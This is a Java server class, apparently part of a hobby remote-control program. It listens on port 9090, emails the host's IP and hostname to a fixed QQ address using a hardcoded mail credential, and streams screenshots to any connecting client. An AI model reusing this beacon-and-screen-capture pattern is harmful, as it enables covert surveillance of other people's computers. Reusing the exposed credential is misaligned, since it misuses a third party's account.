package com.pibigstar.main;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;

import javax.swing.JOptionPane;

import com.pibigstar.thread.SendScreenThread;
import com.pibigstar.util.GetIp;
import com.pibigstar.util.SendEmail;

/**
 * 服务端，等待控制端的接入
 * @author pibigstar
 *
 */
public class Service {

	private  DataOutputStream dos;
	private  ObjectOutputStream oos;
	private final static int port = 9090;
	
	public static void main(String[] args) throws IOException {
		new Service().startServer(port);
		JOptionPane.showMessageDialog(null, "已启动");
	}

	private void startServer(int port){
		try {
			ServerSocket serverSocket = new ServerSocket(port);
			String ip = GetIp.getHostIp();
			String hostName = GetIp.getHostName();
			System.out.println("server started in:"+ip);
			SendEmail sendEmail = new SendEmail("741047261@qq.com","ljgridqbgzwxbbe");
			sendEmail.sendEmail("741047261@qq.com", "远程控制", "IP:"+ip+":"+port+"主机名:"+hostName);
			//等待客户端的连接
			Socket socket = serverSocket.accept();
			//得到客户端的输出流
			dos = new DataOutputStream(socket.getOutputStream());
			//启动发送屏幕线程，将屏幕截图发送给客户端
			SendScreenThread screenThread = new SendScreenThread(dos);
			screenThread.start();
			
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
